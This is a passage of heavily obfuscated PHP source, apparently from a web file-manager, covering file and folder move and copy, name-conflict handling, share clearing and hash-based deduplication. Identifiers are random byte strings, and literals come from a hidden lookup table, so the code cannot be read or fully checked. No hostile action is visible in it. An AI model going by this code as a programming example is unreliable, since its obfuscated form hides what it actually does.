array($£ˆŒ¹Ú²[644], $áéíó¥¿, $„ëÔÂ‰È)); $this->saveAll($ÛšãÊ…·); return $í¦¬å­Í; } private function _childrenMakeRelation($©‰óääı, $óöèŞ¤) { $àËûÑ² =& $_SERVER[¿ğÚ‰±–]; $ÎÛ¾ì¯ = array(); $®×©ğÓ¤ = array(); foreach ($©‰óääı as $òæ¯ûÀ) { $ÄŸœ¦é¸ = $òæ¯ûÀ[$àËûÑ²[32]] . $àËûÑ²[8] . $òæ¯ûÀ[$àËûÑ²[584]]; $ÎÛ¾ì¯[$ÄŸœ¦é¸] = $òæ¯ûÀ[$àËûÑ²[193]]; } foreach ($óöèŞ¤ as $òæ¯ûÀ) { $ÄŸœ¦é¸ = $òæ¯ûÀ[$àËûÑ²[32]] . $àËûÑ²[8] . $òæ¯ûÀ[$àËûÑ²[584]]; $„ñ•Ã™š = $ÎÛ¾ì¯[$ÄŸœ¦é¸]; $®×©ğÓ¤[$„ñ•Ã™š] = $òæ¯ûÀ[$àËûÑ²[193]]; } return $®×©ğÓ¤; } private function _childrenMatch($úşÖ’Òá, $€ŠîóÀˆ, $ú·âŠ÷û) { $·ªëÛ =& $_SERVER[¿ğÚ‰±–]; $ŸÕ±Ô“ = $ú·âŠ÷û[$·ªëÛ[584]]; $°™ô¼à§ = $this->parentLevelArray($€ŠîóÀˆ[$·ªëÛ[584]]); foreach ($°™ô¼à§ as $…›íÓ Ş) { if (isset($úşÖ’Òá[$…›íÓ Ş])) { $ŸÕ±Ô“ .= $úşÖ’Òá[$…›íÓ Ş] . $·ªëÛ[645]; } } $ŸÕ±Ô“ = rtrim($ŸÕ±Ô“, $·ªëÛ[50]) . $·ªëÛ[50]; $²’˜Èó = $this->parentLevelArray($ŸÕ±Ô“); $‘€Æïë = $²’˜Èó[count($²’˜Èó) - 1]; return array($·ªëÛ[192] => $‘€Æïë, $·ªëÛ[584] => $ŸÕ±Ô“); } private function _makeItemData($şôËìÇ·, $ƒÖ±ï¿–, $Ë˜øéÑ´) { $‰•¯ÒÓß =& $_SERVER[¿ğÚ‰±–]; $ßê—÷¾š = array($‰•¯ÒÓß[646] => $şôËìÇ·[$‰•¯ÒÓß[485]], $‰•¯ÒÓß[494] => $Ë˜øéÑ´, $‰•¯ÒÓß[647] => $şôËìÇ·[$‰•¯ÒÓß[486]] ? $şôËìÇ·[$‰•¯ÒÓß[486]] : $‰•¯ÒÓß[12], $‰•¯ÒÓß[542] => $şôËìÇ·[$‰•¯ÒÓß[541]] ? $şôËìÇ·[$‰•¯ÒÓß[541]] : 0, $‰•¯ÒÓß[617] => $şôËìÇ·[$‰•¯ÒÓß[79]] ? $şôËìÇ·[$‰•¯ÒÓß[79]] : 0, $‰•¯ÒÓß[648] => intval($ƒÖ±ï¿–[$‰•¯ÒÓß[190]]), $‰•¯ÒÓß[649] => intval($ƒÖ±ï¿–[$‰•¯ÒÓß[569]]), $‰•¯ÒÓß[650] => intval(USER_ID), $‰•¯ÒÓß[651] => intval(USER_ID), $‰•¯ÒÓß[477] => intval($ƒÖ±ï¿–[$‰•¯ÒÓß[193]]), $‰•¯ÒÓß[652] => $ƒÖ±ï¿–[$‰•¯ÒÓß[584]] . $ƒÖ±ï¿–[$‰•¯ÒÓß[193]] . $‰•¯ÒÓß[50], $‰•¯ÒÓß[498] => $şôËìÇ·[$‰•¯ÒÓß[88]] ? $şôËìÇ·[$‰•¯ÒÓß[88]] : time(), $‰•¯ÒÓß[504] => 0, $‰•¯ÒÓß[653] => $‰•¯ÒÓß[12]); return $ßê—÷¾š; } private function _copyApplyMeta($®÷¯®ª¬, &$¢›Ÿ„Ò¿) { $¯“Öš™¤ =& $_SERVER[¿ğÚ‰±–]; $Íú¿Åë‘ = $®÷¯®ª¬[$¯“Öš™¤[193]]; $ğ®Ş¼¯® = $®÷¯®ª¬[$¯“Öš™¤[32]]; if (!isset($®÷¯®ª¬[$¯“Öš™¤[654]]) || !$®÷¯®ª¬[$¯“Öš™¤[654]] || $®÷¯®ª¬[$¯“Öš™¤[654]] == $¯“Öš™¤[228]) { $¢›Ÿ„Ò¿[$¯“Öš™¤[631]][] = array($¯“Öš™¤[193], $Íú¿Åë‘, $¯“Öš™¤[654], short_id($Íú¿Åë‘)); } if (Input::check($ğ®Ş¼¯®, $¯“Öš™¤[655])) { $¢›Ÿ„Ò¿[$¯“Öš™¤[630]][] = array($¯“Öš™¤[193] => $Íú¿Åë‘, $¯“Öš™¤[97] => $¯“Öš™¤[538], $¯“Öš™¤[450] => str_replace($¯“Öš™¤[53], $¯“Öš™¤[12], Pinyin::get($ğ®Ş¼¯®))); $¢›Ÿ„Ò¿[$¯“Öš™¤[630]][] = array($¯“Öš™¤[193] => $Íú¿Åë‘, $¯“Öš™¤[97] => $¯“Öš™¤[537], $¯“Öš™¤[450] => Pinyin::get($ğ®Ş¼¯®, $¯“Öš™¤[656])); } $¢›Ÿ„Ò¿[$¯“Öš™¤[630]][] = array($¯“Öš™¤[193] => $Íú¿Åë‘, $¯“Öš™¤[97] => $¯“Öš™¤[517], $¯“Öš™¤[450] => KodSort::makeStr($ğ®Ş¼¯®)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($”Èªè¥–) { $åúüå—Š =& $_SERVER[¿ğÚ‰±–]; $–‡ = $this->sourceInfo($”Èªè¥–); $ß¸Š‡ = $åúüå—Š[657]; $Ä¬ÉæäÈ = array($åúüå—Š[584] => array($åúüå—Š[612], $–‡[$åúüå—Š[584]] . $”Èªè¥– . $åúüå—Š[613]), $åúüå—Š[505] => $this->targetIsDelete); $ã›òÓç½ = $this->field($ß¸Š‡)->where($Ä¬ÉæäÈ)->select(); if (!$ã›òÓç½) { return; } $ã›òÓç½ = array_to_keyvalue($ã›òÓç½, $åúüå—Š[193]); foreach ($ã›òÓç½ as $äÜê³üû) { $û‰®¯‚¨ = $äÜê³üû[$åúüå—Š[192]]; $”Èªè¥– = $äÜê³üû[$åúüå—Š[193]]; if (!isset($this->_childrenListCache[$”Èªè¥–]) && $äÜê³üû[$åúüå—Š[485]] == $åúüå—Š[91]) { $this->_childrenListCache[$”Èªè¥–] = array(); } if (!isset($this->_childrenListCache[$û‰®¯‚¨])) { $this->_childrenListCache[$û‰®¯‚¨] = array(); } $this->_childrenListCache[$û‰®¯‚¨][$”Èªè¥–] = $äÜê³üû; $this->_childrenItemCache[$”Èªè¥–] = $äÜê³üû; } } private function _childrenListAll($ğŸÙÛŠ, &$æÈâ²õÄ) { $È³ÒÓ°± =& $_SERVER[¿ğÚ‰±–]; if (!isset($this->_childrenListCache[$ğŸÙÛŠ])) { return; } $Ñ¶ÚŠË = $this->_childrenListCache[$ğŸÙÛŠ]; foreach ($Ñ¶ÚŠË as $Û­“ÏÀ– => $É—¢ÍÄç) { $æÈâ²õÄ[$Û­“ÏÀ–] = $É—¢ÍÄç; if ($É—¢ÍÄç[$È³ÒÓ°±[485]] == $È³ÒÓ°±[91]) { $this->_childrenListAll($Û­“ÏÀ–, $æÈâ²õÄ); } } } private function sourceInfoCache($Ø¹ö¶€) { if (isset($this->_childrenItemCache[$Ø¹ö¶€])) { return $this->_childrenItemCache[$Ø¹ö¶€]; } return $this->sourceInfo($Ø¹ö¶€); } private function _childrenList($œ€ÍŞã”) { if (isset($this->_childrenListCache[$œ€ÍŞã”])) { return $this->_childrenListCache[$œ€ÍŞã”]; } return $this->_childrenListSelect($œ€ÍŞã”); } private function _childrenListSelect($Å…¥óù‘) { $ÍûÔÉ’— =& $_SERVER[¿ğÚ‰±–]; $ÄíÖÏÚá = array($ÍûÔÉ’—[192] => $Å…¥óù‘, $ÍûÔÉ’—[505] => $this->targetIsDelete); $š†ïå = $this->where($ÄíÖÏÚá)->select(); $š†ïå = $š†ïå ? $š†ïå : array(); $†İÊÕõü = array_to_keyvalue($š†ïå, $ÍûÔÉ’—[193]); $this->_childrenListCache[$Å…¥óù‘] = $†İÊÕõü; foreach ($†İÊÕõü as $Å…¥óù‘ => $ñÇ‡ŠŞ„) { $this->_childrenItemCache[$Å…¥óù‘] = $ñÇ‡ŠŞ„; } return $†İÊÕõü; } private function fileNameExistAuto($„é¾Õ¼¤, $¨÷œóÁ¶) { $ªŞ†‡— =& $_SERVER[¿ğÚ‰±–]; if ($¨÷œóÁ¶[$ªŞ†‡—[505]] == $ªŞ†‡—[91]) { return $this->fileNameExist($„é¾Õ¼¤, $¨÷œóÁ¶[$ªŞ†‡—[32]]); } return $this->fileNameExistCache($„é¾Õ¼¤, $¨÷œóÁ¶[$ªŞ†‡—[32]]); } private function fileNameExistCache($ĞÙü®íò, $ÖÌÉ‰À) { $ŸÍ™ÄĞ€ =& $_SERVER[¿ğÚ‰±–]; $ÖÌÉ‰À = strtolower($ÖÌÉ‰À); $ïğĞ‰ùÔ = $this->_childrenList($ĞÙü®íò); foreach ($ïğĞ‰ùÔ as $Çã–‰î›) { if ($ÖÌÉ‰À == strtolower($Çã–‰î›[$ŸÍ™ÄĞ€[32]])) { return $Çã–‰î›[$ŸÍ™ÄĞ€[193]]; } } return !1; } private function fileNameAutoCache($¸ˆÖ„°Ä, $÷¬ª…Ö¨, $ı¦êˆ, $ôÚ™ÑÖ×) { $Éä–àê¬ =& $_SERVER[¿ğÚ‰±–]; $ĞÃùè¼Ü = $this->_childrenList($¸ˆÖ„°Ä); $²Ï‰ƒê = array_to_keyvalue($ĞÃùè¼Ü, $Éä–àê¬[12], $Éä–àê¬[32]); return $this->fileNameAutoGet($²Ï‰ƒê, $÷¬ª…Ö¨, $ı¦êˆ, $ôÚ™ÑÖ×); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($å¿‘´‹À, $µÍåæÔ€, $ìë‚ÂšÂ = REPEAT_REPLACE, $œñ…îòÖ = '') { $à£–Àœá =& $_SERVER[¿ğÚ‰±–]; $ííÚæ¸º = $this->sourceInfo($å¿‘´‹À); $ïÔÜşÆ® = $this->sourceInfo($µÍåæÔ€); if ($ííÚæ¸º[$à£–Àœá[192]] == $ïÔÜşÆ®[$à£–Àœá[193]]) { if ($ííÚæ¸º[$à£–Àœá[505]] == $à£–Àœá[91]) { Model($à£–Àœá[503])->restore(array($å¿‘´‹À)); } if (!$œñ…îòÖ || $œñ…îòÖ == $ííÚæ¸º[$à£–Àœá[32]]) { return $å¿‘´‹À; } } $¨ğˆ‘ñÏ = $this->pathInfoMore($å¿‘´‹À); if ($this->isParentOf($å¿‘´‹À, $µÍåæÔ€)) { return !1; } if (!$ííÚæ¸º || !$ïÔÜşÆ® || $ïÔÜşÆ®[$à£–Àœá[485]] != $à£–Àœá[91]) { return !1; } Hook::trigger($à£–Àœá[658], $¨ğˆ‘ñÏ); $this->targetIsDelete = intval($ííÚæ¸º[$à£–Àœá[505]]); if ($ííÚæ¸º[$à£–Àœá[192]] == $µÍåæÔ€ && $œñ…îòÖ != $ííÚæ¸º[$à£–Àœá[32]]) { $Ó¢ê¥ = $this->fileNameExist($µÍåæÔ€, $œñ…îòÖ); if ($Ó¢ê¥ && $ííÚæ¸º[$à£–Àœá[485]] == $à£–Àœá[228]) { $ë¨óµıÔ = $this->sourceInfo($Ó¢ê¥); $»·õùÎ€ = $this->fileHistory($ë¨óµıÔ, $ííÚæ¸º[$à£–Àœá[541]], $ííÚæ¸º[$à£–Àœá[79]]); if (!$»·õùÎ€) { Model($à£–Àœá[544])->remove($ííÚæ¸º[$à£–Àœá[541]]); } $this->removeNow($å¿‘´‹À, !1); $this->folderSizeReset($µÍåæÔ€); Hook::trigger($à£–Àœá[659], $¨ğˆ‘ñÏ); return $Ó¢ê¥; } } $ÌªÑÃœ® = $œñ…îòÖ ? $œñ…îòÖ : $ííÚæ¸º[$à£–Àœá[32]]; $this->lockMoveStart($å¿‘´‹À); $this->lockWriteStart($µÍåæÔ€, $ÌªÑÃœ®); $“ŒĞÖÎ¦ = array($à£–Àœá[629] => array(), $à£–Àœá[660] => !1); $this->clearShare($å¿‘´‹À, $µÍåæÔ€); $¨ĞšÄ÷Ç = $this->fileNameExistAuto($µÍåæÔ€, $ííÚæ¸º); $úäô–’ğ = $this->_move($å¿‘´‹À, $µÍåæÔ€, $ìë‚ÂšÂ, $“ŒĞÖÎ¦, $œñ…îòÖ); $this->sourceCacheClear(); if ($ííÚæ¸º[$à£–Àœá[485]] == $à£–Àœá[91] && $¨ĞšÄ÷Ç) { $this->folderSizeResetChildren($úäô–’ğ); } Model($à£–Àœá[230])->linkAdd($“ŒĞÖÎ¦[$à£–Àœá[629]]); if ($¨ĞšÄ÷Ç && $“ŒĞÖÎ¦[$à£–Àœá[660]]) { $this->removeNow($å¿‘´‹À, !1); } $this->lockMoveEnd($å¿‘´‹À); $this->lockWriteEnd($µÍåæÔ€, $ÌªÑÃœ®); $this->folderSizeReset($ííÚæ¸º[$à£–Àœá[192]]); $this->folderSizeReset($µÍåæÔ€); $àˆùÊËÈ = array($ííÚæ¸º[$à£–Àœá[192]], $µÍåæÔ€); if ($ííÚæ¸º[$à£–Àœá[485]] == $à£–Àœá[91]) { $àˆùÊËÈ[] = $å¿‘´‹À; } $this->updateModifyTime($àˆùÊËÈ); Model($à£–Àœá[633])->eventMove($å¿‘´‹À, $ííÚæ¸º[$à£–Àœá[192]], $µÍåæÔ€); Hook::trigger($à£–Àœá[659], $¨ğˆ‘ñÏ); return $úäô–’ğ; } private function _move($Ú˜´µ®‘, $î‰÷°Ï¸, $èÏÚË×ˆ, &$÷ñòÄ“œ, $½õõÀ…ö = '') { $’ÁÄµ =& $_SERVER[¿ğÚ‰±–]; $¨¦‡š¥ = $this->sourceInfo($Ú˜´µ®‘); $ÔÊ‰Ğ¾İ = $¨¦‡š¥[$’ÁÄµ[485]] == $’ÁÄµ[91]; $Ø†Ã€â½ = $½õõÀ…ö ? $½õõÀ…ö : $¨¦‡š¥[$’ÁÄµ[32]]; $Ù¾Š˜£„ = $this->fileNameExistAuto($î‰÷°Ï¸, $¨¦‡š¥); $this->lockMoveStart($Ú˜´µ®‘); $this->lockWriteStart($î‰÷°Ï¸, $Ø†Ã€â½); if (!$Ù¾Š˜£„) { return $this->_moveForce($Ú˜´µ®‘, $î‰÷°Ï¸, $Ø†Ã€â½); } $ï÷²äš« = $Ù¾Š˜£„; $Ò°Î€›— = !1; if ($ÔÊ‰Ğ¾İ) { if ($èÏÚË×ˆ == REPEAT_RENAME_FOLDER) { $Ø†Ã€â½ = $this->fileNameAuto($î‰÷°Ï¸, $Ø†Ã€â½, $èÏÚË×ˆ, $ÔÊ‰Ğ¾İ); $ï÷²äš« = $this->_moveForce($Ú˜´µ®‘, $î‰÷°Ï¸, $Ø†Ã€â½); } else { if ($èÏÚË×ˆ == REPEAT_RENAME_FOLDER) { $èÏÚË×ˆ = REPEAT_RENAME; } $ÁÂ°‘¶á = $this->_childrenListSelect($Ú˜´µ®‘); foreach ($ÁÂ°‘¶á as $É±‚ïÏè) { $this->_move($É±‚ïÏè[$’ÁÄµ[193]], $Ù¾Š˜£„, $èÏÚË×ˆ, $÷ñòÄ“œ); } $Ò°Î€›— = !0; } } else { if ($èÏÚË×ˆ == REPEAT_SKIP) { $Ò°Î€›— = !0; } else { if ($èÏÚË×ˆ == REPEAT_RENAME || $èÏÚË×ˆ == REPEAT_RENAME_FOLDER) { $Ø†Ã€â½ = $this->fileNameAuto($î‰÷°Ï¸, $Ø†Ã€â½, $èÏÚË×ˆ, $ÔÊ‰Ğ¾İ); $ï÷²äš« = $this->_moveForce($Ú˜´µ®‘, $î‰÷°Ï¸, $Ø†Ã€â½); } else { if ($èÏÚË×ˆ == REPEAT_REPLACE) { $›úİ”å€ = $this->sourceInfoCache($Ù¾Š˜£„); $­“ÔŸ¿Ç = $this->fileHistory($›úİ”å€, $¨¦‡š¥[$’ÁÄµ[541]], $¨¦‡š¥[$’ÁÄµ[79]]); $Ò°Î€›— = !0; if ($­“ÔŸ¿Ç) { $÷ñòÄ“œ[$’ÁÄµ[629]][] = $¨¦‡š¥[$’ÁÄµ[541]]; } } } } } if ($Ò°Î€›— && !$÷ñòÄ“œ[$’ÁÄµ[660]]) { $÷ñòÄ“œ[$’ÁÄµ[660]] = !0; } return $ï÷²äš«; } private function _moveForce($Ìï”²Ôî, $ªÒœ³®Ã, $˜í•Á´Ô) { $å‡Ô¨š =& $_SERVER[¿ğÚ‰±–]; $Ó¨ª÷š“ = $this->sourceInfo($Ìï”²Ôî); $÷ì”ıŠ = $this->sourceInfo($ªÒœ³®Ã); $Óö €ˆü = $Ó¨ª÷š“[$å‡Ô¨š[485]] == $å‡Ô¨š[91]; $€íçŸ¿ç = array($å‡Ô¨š[477] => $÷ì”ıŠ[$å‡Ô¨š[193]], $å‡Ô¨š[652] => $÷ì”ıŠ[$å‡Ô¨š[584]] . $÷ì”ıŠ[$å‡Ô¨š[193]] . $å‡Ô¨š[50], $å‡Ô¨š[648] => $÷ì”ıŠ[$å‡Ô¨š[190]], $å‡Ô¨š[649] => $÷ì”ıŠ[$å‡Ô¨š[569]], $å‡Ô¨š[651] => USER_ID, $å‡Ô¨š[494] => $˜í•Á´Ô); $’óñİ¬ò = $Ó¨ª÷š“[$å‡Ô¨š[190]] == SourceModel::TYPE_GROUP && $÷ì”ıŠ[$å‡Ô¨š[190]] == SourceModel::TYPE_GROUP && $Ó¨ª÷š“[$å‡Ô¨š[569]] == $÷ì”ıŠ[$å‡Ô¨š[569]]; if (!$’óñİ¬ò && $this->moveClearAuth) { Model($å‡Ô¨š[567])->authClear($Ìï”²Ôî); } $¥ñÊö¦ = $Ó¨ª÷š“[$å‡Ô¨š[505]] == $å‡Ô¨š[91] && $÷ì”ıŠ[$å‡Ô¨š[505]] != $å‡Ô¨š[91]; if ($¥ñÊö¦) { $€íçŸ¿ç[$å‡Ô¨š[504]] = 0; } if ($Óö €ˆü) { $”ìÌ¤¨É = array($å‡Ô¨š[652] => array($å‡Ô¨š[612], $Ó¨ª÷š“[$å‡Ô¨š[584]] . $Ó¨ª÷š“[$å‡Ô¨š[193]] . $å‡Ô¨š[613])); $‘¸Ìß¿í = $Ó¨ª÷š“[$å‡Ô¨š[584]] . $Ó¨ª÷š“[$å‡Ô¨š[193]] . $å‡Ô¨š[50]; $Ë†Â‹È¶ = $÷ì”ıŠ[$å‡Ô¨š[584]] . $÷ì”ıŠ[$å‡Ô¨š[193]] . $å‡Ô¨š[50] . $Ó¨ª÷š“[$å‡Ô¨š[193]] . $å‡Ô¨š[50]; $îÍ•×Ï = array($å‡Ô¨š[652] => array($å‡Ô¨š[661], "\x72\x65\160\154\141\143\x65\x28\x70\141\162\145\156\164\114\145\x76\x65\154\x2c\x27{$‘¸Ìß¿í}\x27\x2c\x27{$Ë†Â‹È¶}\47\51"), $å‡Ô¨š[648] => $÷ì”ıŠ[$å‡Ô¨š[190]], $å‡Ô¨š[649] => $÷ì”ıŠ[$å‡Ô¨š[569]]); if ($¥ñÊö¦) { $îÍ•×Ï[$å‡Ô¨š[504]] = 0; } $this->where($”ìÌ¤¨É)->data($îÍ•×Ï)->save(); } $this->where(array($å‡Ô¨š[491] => $Ìï”²Ôî))->data($€íçŸ¿ç)->save(); return $Ìï”²Ôî; } private function clearShare($å‚Í¥Û, $‡½ÎÂâæ) { $ˆş“İÒØ =& $_SERVER[¿ğÚ‰±–]; $¶üé©ĞŠ = $this->sourceInfo($å‚Í¥Û); $¸Äæóâ¯ = $this->sourceInfo($‡½ÎÂâæ); if ($¶üé©ĞŠ[$ˆş“İÒØ[569]] == $¸Äæóâ¯[$ˆş“İÒØ[569]] && $¶üé©ĞŠ[$ˆş“İÒØ[190]] == $ˆş“İÒØ[662]) { return; } $ò”¤Šğ = array($ˆş“İÒØ[584] => array($ˆş“İÒØ[612], $¶üé©ĞŠ[$ˆş“İÒØ[584]] . $å‚Í¥Û . $ˆş“İÒØ[613])); $£øçÎ‘Æ = $this->field($ˆş“İÒØ[491])->where($ò”¤Šğ)->getField($ˆş“İÒØ[193], !0); if (!$£øçÎ‘Æ) { return; } $ò”¤Šğ = array($ˆş“İÒØ[193] => array($ˆş“İÒØ[7], $£øçÎ‘Æ), $ˆş“İÒØ[663] => 1); $‹¤õşÄ = Model($ˆş“İÒØ[664])->field($ˆş“İÒØ[665])->where($ò”¤Šğ)->select(); if (!$‹¤õşÄ) { return; } $‹¤õşÄ = array_to_keyvalue($‹¤õşÄ, $ˆş“İÒØ[12], $ˆş“İÒØ[665]); $ò”¤Šğ = array($ˆş“İÒØ[665] => array($ˆş“İÒØ[7], $‹¤õşÄ)); Model($ˆş“İÒØ[664])->where($ò”¤Šğ)->save(array($ˆş“İÒØ[663] => 0)); Model($ˆş“İÒØ[666])->where($ò”¤Šğ)->delete(); } public function copyFolderFromIO($ÂÈ è†, $ˆÖÃÏë”, $¤Õ¸Şï, $·Ã ¯ , $¤»©Ï–È, $âöãõ·¯ = false) { $ö—³«ğÖ =& $_SERVER[¿ğÚ‰±–]; $½‘²¬í = array($ö—³«ğÖ[630] => array(), $ö—³«ğÖ[631] => array(), $ö—³«ğÖ[629] => array(), $ö—³«ğÖ[667] => array()); $‚„áßš = $âöãõ·¯ ? $âöãõ·¯ : $ÂÈ è†->pathThis($ˆÖÃÏë”); $ƒÒöú— = $this->fileNameExist($¤Õ¸Şï, $‚„áßš); $ÖÌÂÃôÙ = $this->mkdir($¤Õ¸Şï, $‚„áßš, $·Ã ¯ ); if (!$ƒÒöú— || $·Ã ¯  == REPEAT_RENAME_FOLDER) { $·Ã ¯  = !1; } if ($ƒÒöú—) { $this->_childrenAllMake($ƒÒöú—); } Hook::trigger($ö—³«ğÖ[668]); $this->_copyChildTo($ÂÈ è†, $ˆÖÃÏë”, $ÖÌÂÃôÙ, $·Ã ¯ , $½‘²¬í, $¤»©Ï–È); Hook::trigger($ö—³«ğÖ[669]); if ($ÖÌÂÃôÙ) { $this->folderSizeResetChildren($ÖÌÂÃôÙ); } $this->_childrenListClear(); Model($ö—³«ğÖ[632])->addAll($½‘²¬í[$ö—³«ğÖ[630]], array(), !0); Model($ö—³«ğÖ[633])->eventCopy($ÖÌÂÃôÙ); $this->saveAll($½‘²¬í[$ö—³«ğÖ[631]]); Model($ö—³«ğÖ[544])->linkAdd($½‘²¬í[$ö—³«ğÖ[629]]); Model($ö—³«ğÖ[544])->remove($½‘²¬í[$ö—³«ğÖ[667]]); $this->folderSizeReset($¤Õ¸Şï); $this->updateModifyTime($¤Õ¸Şï); return $ÖÌÂÃôÙ; } private function _copyChildTo($®õ‡«¯ê, $Ø”½è€ê, $‡ù’“¨¯, $¬Âğ€Ëˆ, &$·øïò­ç, $§˜¿•ÑÌ) { $ìÌ‡Ÿ©­ =& $_SERVER[¿ğÚ‰±–]; $¯ˆæ®Ô = $this->sourceInfoCache($‡ù’“¨¯); $‰éâ¾Äƒ = $®õ‡«¯ê->listPath($Ø”½è€ê); $‰éâ¾Äƒ = $‰éâ¾Äƒ ? $‰éâ¾Äƒ : array($ìÌ‡Ÿ©­[86] => array(), $ìÌ‡Ÿ©­[85] => array()); $Êé¹šÄË = array_merge($‰éâ¾Äƒ[$ìÌ‡Ÿ©­[86]], $‰éâ¾Äƒ[$ìÌ‡Ÿ©­[85]]); $Ş·¤¤í‘ = $this->_addFiles($®õ‡«¯ê, $‰éâ¾Äƒ[$ìÌ‡Ÿ©­[86]], $§˜¿•ÑÌ); $¿‚œñŸó = array(); foreach ($Êé¹šÄË as &$Ç¹©©ä¡) { if (isset($Ş·¤¤í‘[$Ç¹©©ä¡[$ìÌ‡Ÿ©­[32]]])) { $Ç¹©©ä¡ = $Ş·¤¤í‘[$Ç¹©©ä¡[$ìÌ‡Ÿ©­[32]]]; } $Ç¹©©ä¡[$ìÌ‡Ÿ©­[485]] = $Ç¹©©ä¡[$ìÌ‡Ÿ©­[33]] == $ìÌ‡Ÿ©­[78]; $Ç¹©©ä¡[$ìÌ‡Ÿ©­[486]] = substr(_get($Ç¹©©ä¡, $ìÌ‡Ÿ©­[169], $ìÌ‡Ÿ©­[12]), 0, 10); $Ç¹©©ä¡[$ìÌ‡Ÿ©­[79]] = _get($Ç¹©©ä¡, $ìÌ‡Ÿ©­[79], 0); $Ç¹©©ä¡[$ìÌ‡Ÿ©­[541]] = _get($Ç¹©©ä¡, $ìÌ‡Ÿ©­[541], 0); if (!isset($Ç¹©©ä¡[$ìÌ‡Ÿ©­[670]]) && $Ç¹©©ä¡[$ìÌ‡Ÿ©­[541]]) { $·øïò­ç[$ìÌ‡Ÿ©­[667]][] = $Ç¹©©ä¡[$ìÌ‡Ÿ©­[541]]; } if ($¬Âğ€Ëˆ) { $©èåè = $this->fileNameExistCache($‡ù’“¨¯, $Ç¹©©ä¡[$ìÌ‡Ÿ©­[32]]); if ($©èåè) { if ($Ç¹©©ä¡[$ìÌ‡Ÿ©­[485]] || $¬Âğ€Ëˆ == REPEAT_SKIP) { continue; } if ($¬Âğ€Ëˆ == REPEAT_REPLACE) { $µ•ô»ÎÛ = $this->sourceInfoCache($©èåè); $”€øÂç = $this->fileHistory($µ•ô»ÎÛ, $Ç¹©©ä¡[$ìÌ‡Ÿ©­[541]], $Ç¹©©ä¡[$ìÌ‡Ÿ©­[79]]); if ($”€øÂç) { $·øïò­ç[$ìÌ‡Ÿ©­[629]][] = $Ç¹©©ä¡[$ìÌ‡Ÿ©­[541]]; } continue; } else { if ($¬Âğ€Ëˆ == REPEAT_RENAME) { $Ç¹©©ä¡[$ìÌ‡Ÿ©­[32]] = $this->fileNameAutoCache($‡ù’“¨¯, $Ç¹©©ä¡[$ìÌ‡Ÿ©­[32]], $¬Âğ€Ëˆ, !1); } } } } if (!$Ç¹©©ä¡[$ìÌ‡Ÿ©­[485]] && $Ç¹©©ä¡[$ìÌ‡Ÿ©­[541]] == 0) { continue; } if (!$Ç¹©©ä¡[$ìÌ‡Ÿ©­[485]] && $Ç¹©©ä¡[$ìÌ‡Ÿ©­[541]]) { $·øïò­ç[$ìÌ‡Ÿ©­[629]][] = $Ç¹©©ä¡[$ìÌ‡Ÿ©­[541]]; } $¿‚œñŸó[] = $this->_makeItemData($Ç¹©©ä¡, $¯ˆæ®Ô, $Ç¹©©ä¡[$ìÌ‡Ÿ©­[32]]); } unset($Ç¹©©ä¡); if (!empty($¿‚œñŸó)) { $this->addAll($¿‚œñŸó); $this->_childrenListSelect($‡ù’“¨¯); } $Öè¨Óô = $this->_childrenList($‡ù’“¨¯); $Öè¨Óô = array_to_keyvalue($Öè¨Óô, $ìÌ‡Ÿ©­[32]); foreach ($Êé¹šÄË as $Ç¹©©ä¡) { $µ•ô»ÎÛ = $Öè¨Óô[$Ç¹©©ä¡[$ìÌ‡Ÿ©­[32]]]; $•ã¦ë÷÷ = $µ•ô»ÎÛ[$ìÌ‡Ÿ©­[193]]; $this->_copyApplyMeta($µ•ô»ÎÛ, $·øïò­ç); if ($Ç¹©©ä¡[$ìÌ‡Ÿ©­[33]] == $ìÌ‡Ÿ©­[78]) { $Ç¹©©ä¡[$ìÌ‡Ÿ©­[87]] = $®õ‡«¯ê->getPathInner($Ç¹©©ä¡[$ìÌ‡Ÿ©­[87]]); $this->_copyChildTo($®õ‡«¯ê, $Ç¹©©ä¡[$ìÌ‡Ÿ©­[87]], $•ã¦ë÷÷, $¬Âğ€Ëˆ, $·øïò­ç, $§˜¿•ÑÌ); } } } private function _addFiles($Œ°Á»Å„, $‡˜«‰ÔŠ, $æ¤¦¼Æ) { $¾±ŸËè =& $_SERVER[¿ğÚ‰±–]; if (!$‡˜«‰ÔŠ || count($‡˜«‰ÔŠ) == 0) { return array(); } $êìÛ ÛÍ = array(); foreach ($‡˜«‰ÔŠ as &$å·Î×ã›) { Hook::trigger($¾±ŸËè[671], $å·Î×ã›); $å·Î×ã›[$¾±ŸËè[87]] = $Œ°Á»Å„->getPathInner($å·Î×ã›[$¾±ŸËè[87]]); $ÂìœÓ³† = $Œ°Á»Å„->hashSimple($å·Î×ã›[$¾±ŸËè[87]]); $™µ´Ù˜Ø = $Œ°Á»Å„->hashMd5($å·Î×ã›[$¾±ŸËè[87]]); if (strlen($™µ´Ù˜Ø) > 10 && !isset($êìÛ ÛÍ[$™µ´Ù˜Ø])) { $êìÛ ÛÍ[$™µ´Ù˜Ø] = array(); } $å·Î×ã›[$¾±ŸËè[672]] = $ÂìœÓ³†; $å·Î×ã›[$¾±ŸËè[547]] = $™µ´Ù˜Ø; $êìÛ ÛÍ[$™µ´Ù˜Ø][] =& $å·Î×ã›; if (count($êìÛ ÛÍ[$™µ´Ù˜Ø]) > 1) { $å·Î×ã›[$¾±ŸËè[670]] = !0; } Hook::trigger($¾±ŸËè[673], $å·Î×ã›); } unset($å·Î×ã›); $ó®ıô™ = array($¾±ŸËè[547] => array($¾±ŸËè[7], array_keys($êìÛ ÛÍ))); $ ÖÇ§·é = Model($¾±ŸËè[674]); $Æ‚õˆ‘ = $ ÖÇ§·é->where($ó®ıô™)->select(); $Æ‚õˆ‘ = $Æ‚õˆ‘ ? $Æ‚õˆ‘ : array(); foreach ($Æ‚õˆ‘ as $ìéï™ĞÉ) { if (!isset($êìÛ ÛÍ[$ìéï™ĞÉ[$¾±ŸËè[547]]])) { continue; } $¼×ÀëÖ = $êìÛ ÛÍ[$ìéï™ĞÉ[$¾±ŸËè[547]]]; foreach ($¼×ÀëÖ as &$å·Î×ã›) { $å·Î×ã›[$¾±ŸËè[541]] = $ìéï™ĞÉ[$¾±ŸËè[541]]; $å·Î×ã›[$¾±ŸËè[670]] = !0; } unset($å·Î×ã›); } $åÉªÀ©¶ = array(); foreach ($‡˜«‰ÔŠ as $¤ö€Çìş) { Hook::trigger($¾±ŸËè[675], $¤ö€Çìş); 